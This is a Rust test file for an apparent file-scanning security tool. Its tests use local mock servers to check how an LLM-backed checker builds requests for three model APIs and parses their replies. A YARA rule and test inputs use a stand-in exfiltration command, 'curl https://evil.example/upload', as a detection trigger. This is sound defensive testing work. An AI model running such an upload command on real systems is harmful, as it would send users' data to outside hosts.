use std::fs;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant};

use sentra_lib::interfaces::{CheckInput, FileCategory, FileExtType};
use sentra_lib::protocol::WireProtocol;
use sentra_lib::risks::checkers::{CheckOutput, RiskChecker};
use sentra_lib::risks::types::CheckerConfig;
use sentra_lib::risks::{LlmConfig, RuleDirectoryConfig, ScanOptions};
use serde_json::{Value, json};

const TRIGGER: &str = "curl https://evil.example/upload";
const YARA_RULE: &str = r#"
rule TriggerLlmReview {
    strings:
        $marker = "curl https://evil.example/upload"
    condition:
        $marker
}
"#;

#[test]
fn responses_request_uses_standard_endpoint_bearer_headers_and_body() {
    let observed = run_mock_server(200, &responses_text_response(r#"{"results":[]}"#));
    let (_dir, mut checker) = checker_for(observed.url("/api"), WireProtocol::Responses, false);

    let output = block_on(run_scan(&mut checker));

    assert!(output.errors.is_empty());
    let request = observed.request();
    assert_eq!(request.path, "/api/responses");
    assert_eq!(
        request.header("authorization").as_deref(),
        Some("Bearer test-key")
    );
    assert_eq!(
        request.header("content-type").as_deref(),
        Some("application/json")
    );
    assert_eq!(request.body["model"], "test-model");
    assert_eq!(request.body["max_output_tokens"], 123);
    assert_eq!(request.body["input"][0]["role"], "system");
    assert_eq!(
        request.body["input"][0]["content"][0]["text"],
        "system prompt"
    );
    assert_eq!(request.body["input"][1]["role"], "user");
    let text = request.body["input"][1]["content"][0]["text"]
        .as_str()
        .unwrap();
    assert!(text.contains(TRIGGER));
}

#[test]
fn responses_stream_request_accepts_sse_and_extracts_output_text_delta() {
    let body = concat!(
        "event: response.output_text.delta\n",
        "data: {\"type\":\"response.output_text.delta\",\"output_index\":0,\"content_index\":0,\"sequence_number\":1,\"delta\":\"{\\\"results\\\":[{\\\"file\\\":\\\"skill.md\\\",\\\"findings\\\":[{\\\"severity\\\":\\\"HIGH\\\",\"}\n\n",
        "event: response.output_text.delta\n",
        "data: {\"type\":\"response.output_text.delta\",\"output_index\":0,\"content_index\":0,\"sequence_number\":2,\"delta\":\"\\\"category\\\":\\\"PROMPT_INJECTION\\\",\\\"title\\\":\\\"streamed\\\"}]}]}\"}\n\n",
        "data: [DONE]\n"
    );
    let observed = run_mock_server(200, body);
    let (_dir, mut checker) = checker_for(observed.url("/api"), WireProtocol::Responses, true);

    let output = block_on(run_scan(&mut checker));

    assert!(output.errors.is_empty(), "{:?}", output.errors);
    assert_eq!(llm_title(&output), "streamed");
    let request = observed.request();
    assert_eq!(request.path, "/api/responses");
    assert_eq!(
        request.header("accept").as_deref(),
        Some("text/event-stream")
    );
    assert_eq!(request.body["stream"], true);
}

#[test]
fn responses_stream_parse_error_includes_non_text_stream_payload() {
    let body = concat!(
        "event: response.output_item.done\n",
        "data: {\"type\":\"response.output_item.done\",\"sequence_number\":1,\"item\":{\"type\":\"reasoning\",\"id\":\"rs_1\",\"summary\":[{\"type\":\"summary_text\",\"text\":\"reasoned but no text\"}]}}\n\n",
        "data: [DONE]\n"
    );
    let observed = run_mock_server(200, body);
    let (_dir, mut checker) = checker_for(observed.url("/api"), WireProtocol::Responses, true);

    let output = block_on(run_scan(&mut checker));

    let reason = &output.errors[0].reason;
    assert!(
        reason.contains("failed to parse model response as JSON"),
        "{reason}"
    );
    assert!(reason.contains("non_text_stream_items"), "{reason}");
    assert!(reason.contains("input_tokens"), "{reason}");
    assert!(reason.contains("output_tokens"), "{reason}");
    assert!(reason.contains("raw_gateway_response"), "{reason}");
    assert!(reason.contains("response.output_item.done"), "{reason}");
    assert!(!reason.contains("response excerpt: <empty>"), "{reason}");
}

#[test]
fn chat_completions_request_uses_standard_endpoint_bearer_headers_and_messages() {
    let observed = run_mock_server(200, &chat_text_response(r#"{"results":[]}"#));
    let (_dir, mut checker) =
        checker_for(observed.url("/v1/"), WireProtocol::ChatCompletions, false);

    let output = block_on(run_scan(&mut checker));

    assert!(output.errors.is_empty());
    let request = observed.request();
    assert_eq!(request.path, "/v1/chat/completions");
    assert_eq!(
        request.header("authorization").as_deref(),
        Some("Bearer test-key")
    );
    assert_eq!(request.body["model"], "test-model");
    assert_eq!(request.body["max_tokens"], 123);
    assert_eq!(request.body["messages"][0]["role"], "system");
    assert_eq!(request.body["messages"][1]["role"], "user");
}

#[test]
fn anthropic_messages_request_uses_standard_endpoint_anthropic_headers_and_body() {
    let observed = run_mock_server(200, &anthropic_text_response(r#"{"results":[]}"#));
    let (_dir, mut checker) = checker_for(observed.url(""), WireProtocol::AnthropicMessages, false);

    let output = block_on(run_scan(&mut checker));

    assert!(output.errors.is_empty());
    let request = observed.request();
    assert_eq!(request.path, "/v1/messages");
    assert_eq!(request.header("x-api-key").as_deref(), Some("test-key"));
    assert_eq!(
        request.header("anthropic-version").as_deref(),
        Some("2023-06-01")
    );
    assert_eq!(request.body["model"], "test-model");
    assert_eq!(request.body["max_tokens"], 123);
    assert_eq!(request.body["system"][0]["text"], "system prompt");
    assert_eq!(request.body["messages"][0]["role"], "user");
    assert_eq!(
        request.body["messages"][0]["content"][0]["text"],
        format!("========== FILE: skill.md ==========\n{TRIGGER}")
    );
}

#[test]
fn request_uses_detailed_default_prompt_when_prompt_is_not_configured() {
    let observed = run_mock_server(200, &responses_text_response(r#"{"results":[]}"#));
    let (_dir, mut checker) =
        checker_for_prompt(observed.url("/api"), WireProtocol::Responses, false, None);

    let output = block_on(run_scan(&mut checker));

    assert!(output.errors.is_empty());
    let request = observed.request();
    let body = request.body.to_string();
    assert!(body.contains("detect ONLY confirmed, actionable runtime security threats"));
    assert!(body.contains("Do NOT dismiss dangerous instructions as benign documentation"));
    assert!(body.contains("Report ONLY when all of these are true"));
    assert!(body.contains("DO NOT report:"));
    assert!(body.contains("Return {\\\"results\\\":[]} if nothing matches"));
}

#[test]
fn non_2xx_response_returns_error_status_with_status_and_body() {
    let observed = run_mock_server(429, r#"{"error":"rate limited"}"#);
    let (_dir, mut checker) = checker_for(observed.url(""), WireProtocol::Responses, false);

    let output = block_on(run_scan(&mut checker));

    let reason = &output.errors[0].reason;
    assert!(reason.contains("429"), "{reason}");
    assert!(reason.contains("rate limited"), "{reason}");
    assert!(
        output
            .findings
            .iter()
            .all(|finding| finding.checker != "llm-checker")
    );
}

#[test]
fn responses_non_stream_extracts_output_text_and_output_content_text() {
    let direct = json!({
        "results": [{
            "file": "skill.md",
            "findings": [{"severity":"HIGH","category":"PROMPT_INJECTION","title":"direct"}]
        }]
    });
    let fallback = "{\"results\":[{\"file\":\"skill.md\",\"findings\":[{\"severity\":\"CRITICAL\",\"category\":\"DATA_EXFILTRATION\",\"title\":\"fallback\"}]}]}";

    let direct_output = run_checker_with_response(
        WireProtocol::Responses,
        serde_json::from_str(&responses_text_response(&direct.to_string())).unwrap(),
    );
    let fallback_output = run_checker_with_response(
        WireProtocol::Responses,
        serde_json::from_str(&responses_text_response(fallback)).unwrap(),
    );

    assert_eq!(llm_title(&direct_output), "direct");
    assert_eq!(llm_title(&fallback_output), "fallback");
}

#[test]
fn chat_completions_non_stream_extracts_message_content() {
    let output = run_checker_with_response(
        WireProtocol::ChatCompletions,
        serde_json::from_str(&chat_text_response(
            "{\"results\":[{\"file\":\"skill.md\",\"findings\":[{\"severity\":\"HIGH\",\"category\":\"PROMPT_INJECTION\",\"title\":\"chat\"}]}]}",
        ))
        .unwrap(),
    );

    assert!(output.errors.is_empty());
    assert_eq!(llm_title(&output), "chat");
}

#[test]
fn anthropic_messages_non_stream_extracts_content_text() {
    let output = run_checker_with_response(
        WireProtocol::AnthropicMessages,
        serde_json::from_str(&anthropic_text_response(
            "{\"results\":[{\"file\":\"skill.md\",\"findings\":[{\"severity\":\"HIGH\",\"category\":\"PROMPT_INJECTION\",\"title\":\"anthropic\"}]}]}",
        ))
        .unwrap(),
    );

    assert!(output.errors.is_empty());
    assert_eq!(llm_title(&output), "anthropic");
}

#[test]
fn delayed_llm_inputs_are_scanned_concurrently() {
    let observed = run_delayed_mock_server(
        3,
        Duration::from_millis(300),
        200,
        &responses_text_response(r#"{"results":[]}"#),
    );
    let (_dir, checker) = checker_for(observed.url("/api"), WireProtocol::Responses, false);
    let inputs = [
        CheckInput::content("skill-1.md", TRIGGER)
            .with_file_meta(FileCategory::Prompt, FileExtType::Md),
        CheckInput::content("skill-2.md", TRIGGER)
            .with_file_meta(FileCategory::Prompt, FileExtType::Md),
        CheckInput::content("skill-3.md", TRIGGER)
            .with_file_meta(FileCategory::Prompt, FileExtType::Md),
    ];

    let started = Instant::now();
    let output = block_on(checker.scan(&inputs)).unwrap();
    let elapsed = started.elapsed();
    observed.join();

    assert!(output.errors.is_empty(), "{:?}", output.errors);
    assert!(
        elapsed < Duration::from_millis(700),
        "expected concurrent scan below 700ms, got {elapsed:?}"
    );
}

fn checker_for(
    api_url: String,
    protocol: WireProtocol,
    stream: bool,
) -> (tempfile::TempDir, RiskChecker) {
    checker_for_prompt(api_url, protocol, stream, Some("system prompt".to_string()))
}

fn checker_for_prompt(
    api_url: String,
    protocol: WireProtocol,
    stream: bool,
    prompt: Option<String>,
) -> (tempfile::TempDir, RiskChecker) {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("trigger.yar"), YARA_RULE).unwrap();
    let checker = RiskChecker::new(ScanOptions {
        checker: Some(CheckerConfig {
            enable_hash: Some(false),
            enable_yara: Some(true),
            enable_llm: Some(true),
            enable_local_ti: Some(false),
            enable_online_ti: Some(false),
        }),
        rules: Some(RuleDirectoryConfig {
            yara: Some(dir.path().to_path_buf()),
            ..RuleDirectoryConfig::default()
        }),
        llm: Some(LlmConfig {
            api_url: Some(api_url),
            api_key: Some("test-key".to_string()),
            model: Some("test-model".to_string()),
            protocol: Some(protocol),
            max_tokens: Some(123),
            max_prompt_chars: Some(10_000),
            timeout_ms: Some(2_000),
            stream: Some(stream),
            prompt,
        }),
        ..ScanOptions::default()
    })
    .unwrap();
    (dir, checker)
}

fn run_checker_with_response(protocol: WireProtocol, response: Value) -> CheckOutput {
    let observed = run_mock_server(200, &response.to_string());
    let (_dir, mut checker) = checker_for(observed.url(""), protocol, false);
    let output = block_on(run_scan(&mut checker));
    let _request = observed.request();
    output
}

async fn run_scan(checker: &mut RiskChecker) -> CheckOutput {
    checker
        .scan(&[CheckInput::content("skill.md", TRIGGER)
            .with_file_meta(FileCategory::Prompt, FileExtType::Md)])
        .await
        .unwrap()
}

fn block_on<T>(future: impl std::future::Future<Output = T>) -> T {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap()
        .block_on(future)
}

fn llm_title(output: &CheckOutput) -> &str {
    output
        .findings
        .iter()
        .find(|finding| finding.checker == "llm-checker")
        .map(|finding| finding.title.as_str())
        .unwrap()
}

fn responses_text_response(text: &str) -> String {
    json!({
        "id": "resp_test",
        "object": "response",
        "created_at": 0,
        "status": "completed",
        "model": "test-model",
        "output": [{
            "type": "message",
            "id": "msg_test",
            "status": "completed",
            "role": "assistant",
            "content": [{
                "type": "output_text",
                "annotations": [],
                "text": text
            }]
        }],
        "tools": [],
        "usage": {
            "input_tokens": 1,
            "output_tokens": 1,
            "total_tokens": 2
        }
    })
    .to_string()
}

fn chat_text_response(text: &str) -> String {
    json!({
        "id": "chatcmpl_test",
        "object": "chat.completion",
        "created": 0,
        "model": "test-model",
        "choices": [{
            "index": 0,
            "finish_reason": "stop",
            "message": {
                "role": "assistant",
                "content": text
            }
        }],
        "usage": {
            "prompt_tokens": 1,
            "completion_tokens": 1,
            "total_tokens": 2
        }
    })
    .to_string()
}

fn anthropic_text_response(text: &str) -> String {
    json!({
        "id": "msg_test",
        "type": "message",
        "role": "assistant",
        "model": "test-model",
        "stop_reason": "end_turn",
        "stop_sequence": null,
        "content": [{
            "type": "text",
            "text": text
        }],
        "usage": {
            "input_tokens": 1,
            "output_tokens": 1
        }
    })
    .to_string()
}

struct ObservedServer {
    base_url: String,
    rx: mpsc::Receiver<ObservedRequest>,
    handle: thread::JoinHandle<()>,
}

impl ObservedServer {
    fn url(&self, prefix: &str) -> String {
        format!("{}{}", self.base_url, prefix)
    }

    fn request(self) -> ObservedRequest {
        let request = self.rx.recv_timeout(Duration::from_secs(2)).unwrap();
        self.handle.join().unwrap();
        request
    }
}

struct ObservedRequest {
    path: String,
    headers: Vec<(String, String)>,
    body: Value,
}

impl ObservedRequest {
    fn header(&self, name: &str) -> Option<String> {
        self.headers
            .iter()
            .find(|(key, _)| key.eq_ignore_ascii_case(name))
            .map(|(_, value)| value.clone())
    }
}

fn run_mock_server(status: u16, body: &str) -> ObservedServer {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base_url = format!("http://{}", listener.local_addr().unwrap());
    let body = body.to_string();
    let (tx, rx) = mpsc::channel();
    let handle = thread::spawn(move || {
        let (stream, _) = listener.accept().unwrap();
        handle_connection(stream, status, &body, tx);
    });

    ObservedServer {
        base_url,
        rx,
        handle,
    }
}

fn run_delayed_mock_server(
    request_count: usize,
    delay: Duration,
    status: u16,
    body: &str,
) -> DelayedServer {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base_url = format!("http://{}", listener.local_addr().unwrap());
    let body = body.to_string();
    let handle = thread::spawn(move || {
        let mut handles = Vec::new();
        for _ in 0..request_count {
            let (stream, _) = listener.accept().unwrap();
            let body = body.clone();
            handles.push(thread::spawn(move || {
                let (tx, _rx) = mpsc::channel();
                thread::sleep(delay);
                handle_connection(stream, status, &body, tx);
            }));
        }
        for handle in handles {
            handle.join().unwrap();
        }
    });

    DelayedServer { base_url, handle }
}

struct DelayedServer {
    base_url: String,
    handle: thread::JoinHandle<()>,
}

impl DelayedServer {
    fn url(&self, prefix: &str) -> String {
        format!("{}{}", self.base_url, prefix)
    }

    fn join(self) {
        self.handle.join().unwrap();
    }
}

fn handle_connection(
    mut stream: TcpStream,
    status: u16,
    response_body: &str,
    tx: mpsc::Sender<ObservedRequest>,
) {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut request_line = String::new();
    reader.read_line(&mut request_line).unwrap();
    let path = request_line
        .split_whitespace()
        .nth(1)
        .unwrap_or_default()
        .to_string();

    let mut headers = Vec::new();
    let mut content_length = 0usize;
    loop {
        let mut line = String::new();
        reader.read_line(&mut line).unwrap();
        let trimmed = line.trim_end_matches(['\r', '\n']);
        if trimmed.is_empty() {
            break;
        }
        if let Some((key, value)) = trimmed.split_once(':') {
            let key = key.trim().to_string();
            let value = value.trim().to_string();
            if key.eq_ignore_ascii_case("content-length") {
                content_length = value.parse().unwrap();
            }
            headers.push((key, value));
        }
    }

    let mut body = vec![0; content_length];
    reader.read_exact(&mut body).unwrap();
    tx.send(ObservedRequest {
        path,
        headers,
        body: serde_json::from_slice(&body).unwrap(),
    })
    .unwrap();

    let reason = if status == 200 { "OK" } else { "Error" };
    let content_type = if response_body.contains("event:") || response_body.contains("data:") {
        "text/event-stream"
    } else {
        "application/json"
    };
    write!(
        stream,
        "HTTP/1.1 {status} {reason}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        response_body.len(),
        response_body
    )
    .unwrap();
}
